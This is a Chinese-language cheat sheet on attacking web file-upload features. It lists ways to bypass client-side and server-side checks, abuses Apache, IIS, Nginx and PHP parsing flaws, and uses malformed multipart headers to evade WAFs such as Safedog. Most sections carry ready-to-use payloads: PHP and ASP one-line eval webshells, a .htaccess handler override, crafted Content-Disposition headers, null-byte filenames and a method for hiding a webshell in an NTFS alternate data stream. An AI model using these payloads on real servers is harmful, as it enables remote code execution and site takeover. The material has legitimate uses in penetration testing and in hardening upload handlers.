#上传入口
	
测试上传不同文件类型检测属于白名单还是黑名单

测试上传文件的大小限制，上传频率和总文件数量

测试文件内容是否与定义的文件类型匹配

测试上传恶意文件检测是否具有WAF和杀软

测试上传的文件在不在相同的主机名/端口上（单独的文件服务器）

测试上传的文件是否与身份验证和授权模式集成

###轻量级检测

判断是客户端还是服务端检测的依据：

1.当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式为前端JS脚本检测。

2.使用抓包工具查看客户端是否向服务器提交了数据包，如果没有则是js验证。

###客户端

*	JS脚本检测

	1.文件大小

	2.文件扩展名

*	绕过方法
			
	1.禁用JS
			
	2.删除相关JS代码
			
	3.BurpSuite截包修改绕过（可以利用burp抓包改包，先上传一个白名单gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。）

###服务端

*	MIME检测`Content-Type`类型是否合法
		
	绕过方法

	`Content-Type: application/x-php`

	抓包更改文件类型为允许的白名单类型例如图片格式绕过

	`Content-Type: image/gif`

*	文件内容检测

	1.文件头校验（GIF89a）

	2.文件类型相关信息检测（文件幻数检测的升级版）

	3.文件加载检测

	4.渲染/加载测试
	
	5.二次渲染

	适合格式：gif

	服务端对上传的图片进行二次渲染。导致我们注入的代码在渲染之后被“清洗”掉了！这时候我们就得思考如何去绕过。
	
	绕过思路：对比上传前和上传后的图片的差异，找到相同数据同时又是非图片数据区的地方，在此处写入恶意代码。

	>在不破坏文件本身正常渲染情况下，在图片的注释区插入一句话。

总之对文件完整性检测的绕过,通常就直接用个结构完整的文件进行代码注入即可,没必要再去测到底是检查的幻数还是文件头结构之类的了    **搭配解析漏洞**

*	路径/扩展名检测
	
	1.后缀名黑名单校验：

		文件名大小写绕过

	检测绕过

		特殊文件名绕过
		0x00 截断绕过

	检测未绕过

		.htaccess 文件解析漏洞
		本地文件包含漏洞LFI
		Apache 解析漏洞
		IIS 解析漏洞
		Nginx 解析漏洞

	2.后缀名白名单校验：
		
	检测绕过

		0x00 截断绕过

	检测未绕过
	
	配合本地文件包含漏洞LFI绕过				
	
	前提：当校验规则以文件后缀名为（asp/php/jsp）依据来判断上传文件内容是否合法，而忽略检测文件内容。
	
	绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）
		
	（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；
		
	（2）然后再上传一个.php的文件，内容为`<?php Include("上传的txt文件路径");?>`

	此时，这个php文件就会去引用txt文件的内容，从而绕过校验。

	注：此处第二步应该是配合目标网站已存在的本地文件包含漏洞

	下面列举包含的语法：

	PHP

	```
	<?php Include("上传的txt文件路径");?> 
	```

	ASP    

	```
	<!--#include file="上传的txt文件路径" -->
	```

	JSP  

	```
	<jsp:inclde page="上传的txt文件路径"/>
	```

	or 

	``` 
	<% @include file="上传的txt文件路径" %>
	```

	__配合服务器解析漏洞绕过__

	**配合操作系统文件命名规则绕过**
			
	（1）上传不符合windows文件命名规则的文件名

		test.asp.
		test.asp(空格)
		test.php:1.jpg
		test.php::$DATA
		shell.php::$DATA…….
		若这样命名，会被windows系统自动去掉不符合规则符号后面的内容,我们可以通过抓包，在文件名后加一个空格或者点绕过黑名单，若上传成功，空格和点都会被windows自动消除,这样也可以getshell。
	
	（2）windows下后缀名大小写不敏感

		在windows下，如果上传php不被解析，可以试试上传pHp后缀的文件名。

	其他

		1. 后缀名大小写绕过shell.pHp
		2. 双写后缀名绕过shell.phpphp
		3. 特殊后缀名绕过shell.php3 

	
*	自定义正则校验

	文件上传内容​过滤了​`<?`
	
	后端逻辑是 `file_put_contents `,这个函数的第二个参数可以是一个数组,相当于 

	```
	file_put_contents($filename, join('', $array)) 
	```

	filename要被写入数据的文件名

	因此数组可以绕过内容检查,从而而造成任意文文件上传。

	绕过方法：`content[]`重复传参2次，第一次传了`<`第二次传了`?`成功绕过。
		
		ext=php&content[]=<&content[]=?php​ ​ @eval($_POST['fuck']);​ ​ ?>

##web 应用程序解析漏洞

###Apache
1.扩展名解析顺序漏洞

影响版本：

黑名单：shell.php.abc任意不属于黑名单范畴的扩展名

白名单：shell.php.gif必须是白名单之内的扩展名

漏洞原理：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如`test.php.owf.rar`  `.owf`和`.rar` 这两种后缀是apache不可识别解析,apache就会把`test.php.owf.rar`解析成php。

漏洞触发条件：

*	只适用于以module方式解析php的apache，使用fastcgi方式解析php的apache不受影响

*	在apache的主配置文件httpd.conf中“DefaultType”设置选项中，定义了apache处理未知扩展名文件的方法。文件httpd.conf中语句块中可以用“AddType”语句来定义apache解析不同扩展名文件的方法。文件扩展名中至少带有一个“.php”，否则将默认被作为txt/html文档处理。

2.`.htaccess`文件突破黑名单解析(写权限)

上传覆盖.htaccess文件，重写解析规则绕过。

```
<FilesMatch "shell.jpg"> 
SetHandler application/x-httpd-php 
</FilesMatch>
```

同目录下上传shell.jpg一句话，这样shell.jpg就可解析为php文件

###IIS

1.IIS 5.x/6.0 +ASP解析漏洞
	
*	目录解析`/shell.asp/1.jpg`

	在网站下建立名字为` .asp、.asa `的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。
	执行必须满足2个条件：

	A：你可以自建shell.asp文件夹（写权限）；

	B：你需要上传图片shell到shell.asp文件夹下；

*	文件解析shell.asp;.jpg
				
	原理：服务器默认不解析;号后面的内容，因此`xx.asp;.jpg`便被解析成asp文件了。只要文件名中含有`.asp;`会优先按 asp 来解析。

	IIS6.0 默认的可执行文件除了asp还包含（asa、cer、cdx）

2.IIS7.0/7.5 + PHP（php-cgi的问题）
	
*	 配合文件上传漏洞，首先上传一个包含一句话的jpg或txt文件，此时直接访问，服务器并不会解析执行其中的一句话，这时我们在(/shell.jpg)后面加上一个莫须有的以.php结尾的文件名，例如/xx.php，则/shell.jpg/xx.php会被IIS解析为 php 文件。
	
	解析漏洞执行条件：
	
	1.Fast-CGI开启

	2.php.ini里设置cgi.fix_pathinfo=1

	3.IIS-->处理程序映射--->FastCgiModule模块映射--->请求限制--->映射--->仅当请求映射至以下内容时才调用处理程序（该选项未勾选）

###Nginx

1.Nginx 空字节代码执行漏洞

影响版本：nginx 0.5.*，nginx 0.6.*，nginx 0.7 <= 0.7.65，nginx 0.8 <= 0.8.37）这个问题会影响nginx 0.8.41  -  1.5.6，问题在nginx 1.5.7，1.4.4中修复。

在图片中嵌入PHP代码然后通过访问shell.jpg%00.php来执行其中的代码,

第一种方法：

1）shell命名为shell.php空格.gif				

2）burpsuite截包，Ctrl+R到Repeater，在Repeater 的Hex界面Hex中修改20为00
点击Go,在右侧Response 中看返回状态，成功的话在里面找到文件路径。

第二种方法：

3）上传文件3333.gif,burpsuite截包，Ctrl+R到Repeater，修改文件名为3333.php%00.gif,Repeater 的Raw 界面快捷键Ctrl+Shift+u转换%00为URL编码或者Intercept 界面快捷键Ctrl+Shift+u转换%00为URL编码

4）Forward
				
2.对任意文件名,在后面添加/任意文件名.php的解析漏洞（php-cgi的问题）比如原本文件名是shell.jpg,可以添加为shell.jpg/xx.php 进行解析攻击

解析漏洞执行条件：php.ini里`cgi.fix_pathinfo=1`(默认为1)

###PHP 
	
####PHP DOS漏洞的新利用：CVE-2015-4024 
	
绕过当前各种云WAF的文件上传防御策略

`“test3.jpg空格123/shell.php`WAF解析到的文件名为test3.jpg，而PHP解析到的文件名是`test3.jpg空格123/shell.php`因为`/`是目录分隔符，上传的文件名变为`shell.php`

注意：文件名前面有一个双引号，而后面不能有双引号`‘test3.jpg空格123/shell.php`测试单引号也能成功（方法同上）

####PHP  %00截断

文件包含时，如果被指定了后缀，可以用%00截断。%00 会被解析为0x00，所以导致截断的发生，成功的绕过了后缀限制。
`index.php?page=/usr/share/php/index.php%00`
有两个条件：php版本小于5.3.4和`magic_quotes_gpc`为off状态。 
如果将`magic_quotes_gpc`改为on就不能截断了，
因为开启`magic_quotes_gpc`后%00会被加上一个反斜杠转义掉。

###协议层面绕过WAF上传的检测

####协议解析不正确-文件名覆盖(一)

 1.在multipart协议中，一个文件上传块存在多个Content-Disposition，将以最后一个Content-Disposition的filename值作为上传的文件名。许多WAF解析到第一个Content-Disposition就认为协议解析完毕，获得上传的文件名，从而导致被绕过。加速乐的WAF解析得到文件名是”445.gif”，但PHP解析结果是”445.php”，导致被绕过。


```
Content-Disposition: form-data; name="file"; filename="445.gif"
```

```
Content-Disposition: form-data; name="file"; filename="445.php" 

Content-Type: image/gif
```

针对早期版本安全狗，可以多加一个filename

```
Content-Disposition: form-data; name="file"; filename="445.gif"; filename="445.php"
```

在IIS6.0下如果我们换一种书写方式，把filename放在其他地方也可以上传成功：

```
Content-Disposition: form-data; name="file"; 
Content-Type: image/gif filename="445.asp"
```

####协议解析不正确-文件名覆盖（二）

2.在一个Content-Disposition 中，存在多个filename ，协议解析应该使用最后的filename值作为文件名。如果WAF解析到filename="445.txt"认为解析到文件名，结束解析，将导致被绕过。因为后端容器解析到的文件名是445.php。

```
Content-Disposition: form-data; name="file"; filename="445.gif";filename="445.php"
```

####协议解析不正确-遗漏文件名

3.当WAF遇到`“name=”myfile";;”`时，认为没有解析到filename。而后端容器继续解析到的文件名是445.php，导致WAF被绕过。

```
Content-Disposition: form-data; name="file";;filename="445.php";
```

####协议解析不正确-未解析所有文件

4.multipart协议中，一个POST请求可以同时上传多个文件。许多WAF只检查第一个上传文件，没有检查上传的所有文件，而实际后端容器会解析所有上传的文件名，攻击者只需把paylaod放在后面的文件部分，即可绕过。

```
Content-Disposition: form-data; name="file"; filename="445.gif"（正常文件）
Content-Disposition: form-data; name="file"; filename="445.php"（payload）
```

####协议解析不一致-文件名解析兼容性

5.multipart协议中，文件名的形式为filename="abc.php"。但是Tomcat、PHP等容器解析协议时会做一些兼容，能正确解析 

```
Content-Disposition: form-data; name="file"; filename=abc.php（不加双引号）
Content-Disposition: form-data; name="file"; filename="abc.php（只加一个双引号）
Content-Disposition: form-data; name="file"; filename='abc.php'（使用单引号）
...
```

 而WAF只按照协议标准去解析，无法解析文件名，但是后端容器能正确获得文件名，从而导致被绕过。

 6.POST/GET
有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。
此种情况可以上传一个POST型的数据包，抓包将POST改为GET。

7.利用waf本身缺陷

1.删除实体里面的Conten-Type字段。第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。
正常包：

```
Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png"
Content-Type: image/png
```

构造包：

```
Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png
C.php"
```

8.删除Content-Disposition字段里的空格

```
Content-Disposition: 空格form-data; name="image"; 
```

增加一个空格导致安全狗被绕过案列：

```
Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099
```

尝试在boundary后面加个空格或者其他可被正常处理的字符：

```
boundary=空格—————————4714631421141173021852555099
```

9.修改Content-Disposition字段值的大小写

```
Content-Disposition: form-data; nAme="image";
```

10.Boundary边界不一致
每次文件上传时的Boundary边界都是一致的：

```
Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099后面随便添加一些值
Content-Length: 253
```

```
-----------------------------4714631421141173021852555099
Content-Disposition: form-data; name="file1"; filename="shell.asp"
Content-Type: application/octet-stream
<%eval request("a")%>
-----------------------------4714631421141173021852555099--
```

但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨，会导致上传成功。

11.文件名处回车

```
Content-Disposition: form-data; name="file1"; filename=

"shell.asp"
```

12.利用NTFS ADS特性
ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。

在webshell中的使用，在服务器上echo一个数据流文件到正常网页上。比如

```
echo ^<?php eval($_POST[cmd])?^ >> index.php:hidden.txt  
```

index网页会正常显示，就是会多了一个流文件，我们上传一个正常的php文件，文件包含内容是

```
<pre name="code" class="html"><?php include('index.php:hidden.txt')?>  
```

一句话便被包含进来了，达到了隐蔽的效果。

绕过黑名单验证

在测试中我们发现，如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析。假设我们需要上传的文件内容为：

```
<?php phpinfo();?>
```

下面是上传时会出现的现象：

```
<pre name="code" class="html">
```

<table>
	<tr>
		<td>
		上传的文件名
		</td>
		<td>
		服务器表面现象
		</td>
		<td>
		生成的文件内容
		</td>
	</tr>
	<tr>
		<td>
		Test.php:a.jpg
		</td>
		<td>
		生成Test.php
		</td>
		<td>
		空
		</td>
	</tr>
	<tr>
		<td>
		Test.php::$DATA
		</td>
		<td>
		生成test.php
		</td>
		<td>
		&lt;?php phpinfo();?>
		</td>
	</tr>	
	<tr>
		<td>
		Test.php::$INDEX_ALLOCATION
		</td>
		<td>
		生成test.php文件夹
		</td>
		<td>
		空
		</td>
	</tr>
	<tr>
		<td>
		Test.php::$DATA\0.jpg
		</td>
		<td>
		生成0.jpg
		</td>
		<td>
		&lt;?php phpinfo();?>
		</td>
	</tr>	
</table>

PS: 上传`test.php:a.jpg`的时候其实是在服务器上正常生成了一个数据流文件，可以通过
`notepad test.php:a.jpg`查看内容，而test.php为空也是正常的。 根据第二个现象，我们可以bypass一些黑名单验证。 后面加\0测试的时候是想截断后面的东西，但是发现windows会无视
”/”、”\”这两个符号前面的东西，只识别这俩符号后的字符串。(由于windows把\ /当成了目录，而上传只认识文件名所导致的)

13.利用16进制编码转换小数点突破上传

上传情况简介：

上传  111.jpg111 确实可以成功的但是上传  1.php.jpg1111.1 失败了？这个告诉我们，文件名必须包含 jpg 三个字母，且后缀必须为 .jpg当然你也可以不给他.jpg 但是不能为其他 .* 意思就是你可以这样：1.phpjpg 或者 1.phpng 在或者 1.jpg1213456 但是就是不能 1.jpg .php

尝试 .php.jpg111.1 失败

所以我们当前上传判断是这样的，  jpg是必须带入到文件名 且后缀小数点后方必须为 jpg 或者其他图片格式（jpeg png gif bmp），我们利用将小数点转换为16进制编码。从而绕过。

```
111.php&#x2e;jpg
```

----

#结语

通过分析PHP、tomcat的协议解析源码，找出它们与HTTP标准协议的差异是发现绕过WAF的快速有效方法。

为什么文件上传表单是主要的安全威胁 
https://www.oschina.net/translate/upload-forms-threat